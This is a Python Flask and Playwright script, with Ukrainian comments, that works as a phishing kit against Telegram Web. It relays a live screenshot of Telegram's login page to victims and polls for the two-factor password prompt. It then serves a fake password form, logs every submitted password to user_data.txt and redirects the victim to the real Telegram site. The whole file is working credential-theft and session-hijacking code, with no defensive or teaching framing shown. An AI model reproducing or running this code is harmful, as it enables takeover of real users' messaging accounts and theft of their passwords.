from flask import Flask, send_file, request, jsonify, redirect
from multiprocessing import Process, Value
from playwright.sync_api import sync_playwright
import time
import os
import shutil

app = Flask(__name__)
TARGET_URL = "https://web.telegram.org/a/"
SCREENSHOT_PATH = "screenshot.png"
STATIC_SCREENSHOT_PATH = "static/screenshot.png"
DATA_FILE_PATH = "user_data.txt"

browser_ready = Value("b", False)
form_detected = Value("b", False)
screenshot_ready = Value("b", False)

def start_browser(browser_ready, form_detected, screenshot_ready):
    """Запускає браузер, робить скріншот і залишає відкритим для подальшого моніторингу."""
    with sync_playwright() as p:
        browser = p.chromium.launch(headless=False, args=["--remote-debugging-port=9222"])
        context = browser.new_context()
        page = context.new_page()
        page.goto(TARGET_URL, wait_until="networkidle")

        screen_size = page.evaluate("({ width: window.innerWidth, height: window.innerHeight })")
        width = screen_size["width"]
        height = screen_size["height"]
        page.set_viewport_size({"width": width, "height": height})

        print(f"Браузер відкрив {TARGET_URL} ({width}x{height}) та готує скріншот")

        time.sleep(10)  # Чекаємо 10 секунд перед скріншотом
        page.screenshot(path=SCREENSHOT_PATH, clip={"x": 0, "y": 0, "width": width, "height": height})
        print(f"Скріншот збережено: {SCREENSHOT_PATH}")

        shutil.move(SCREENSHOT_PATH, STATIC_SCREENSHOT_PATH)
        print(f"Скріншот переміщено в {STATIC_SCREENSHOT_PATH}")

        screenshot_ready.value = True  # Позначаємо, що скріншот готовий

        # **Моніторинг появи поля пароля**
        while True:
            try:
                password_input = page.query_selector('input[type="password"]')
                if password_input and not form_detected.value:
                    print("Форма введення пароля виявлена!")
                    form_detected.value = True
                elif not password_input:
                    form_detected.value = False
            except Exception as e:
                print(f"Помилка при перевірці DOM: {e}")
            time.sleep(1)

@app.route("/")
def index():
    """Чекає, поки скріншот буде готовий, і тільки тоді віддає сторінку."""
    while not screenshot_ready.value:
        time.sleep(1)  # Чекаємо, поки скріншот буде створено
    return send_file("index.html")

@app.route("/screenshot.png")
def show_screenshot():
    """Віддає скріншот, якщо він готовий."""
    if not screenshot_ready.value:
        return "Скріншот ще не готовий", 404
    return send_file(STATIC_SCREENSHOT_PATH, mimetype="image/png")

@app.route("/check-form-status")
def check_form_status():
    """Перевіряє, чи з'явилася форма пароля."""
    return jsonify({"form_detected": form_detected.value})

@app.route("/input", methods=["GET", "POST"])
def input_page():
    """Сторінка введення пароля."""
    if request.method == "POST":
        user_input = request.form.get("password", "").strip()
        if user_input:
            with open(DATA_FILE_PATH, "a") as file:
                file.write(user_input + "\n")
            return redirect("https://web.telegram.org/a/")  # Після введення пароля переходимо назад на Telegram Web
        return "Введіть пароль!", 400

    return send_file("input.html")

if __name__ == "__main__":
    if not os.path.exists("static"):
        os.mkdir("static")

    browser_process = Process(target=start_browser, args=(browser_ready, form_detected, screenshot_ready))
    browser_process.start()
    
    app.run(host="0.0.0.0", port=5000)
